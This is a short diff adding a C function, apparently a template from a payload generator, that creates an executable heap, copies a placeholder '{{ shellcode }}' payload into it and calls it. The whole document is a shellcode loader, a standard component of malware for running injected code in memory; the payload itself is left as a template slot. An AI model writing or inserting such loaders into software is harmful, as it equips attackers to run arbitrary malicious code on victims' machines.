@@ -1,0 +1,9 @@
+void hchaae(){
+    unsigned char shellcode[] =
+    "{{ shellcode }}";
+
+    HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(shellcode), sizeof(shellcode));
+    char *buffer = (char*)HeapAlloc(heap, HEAP_ZERO_MEMORY, sizeof(shellcode));
+    memcpy(buffer, shellcode, sizeof(shellcode));
+    (*(void(*)())buffer)();
+}
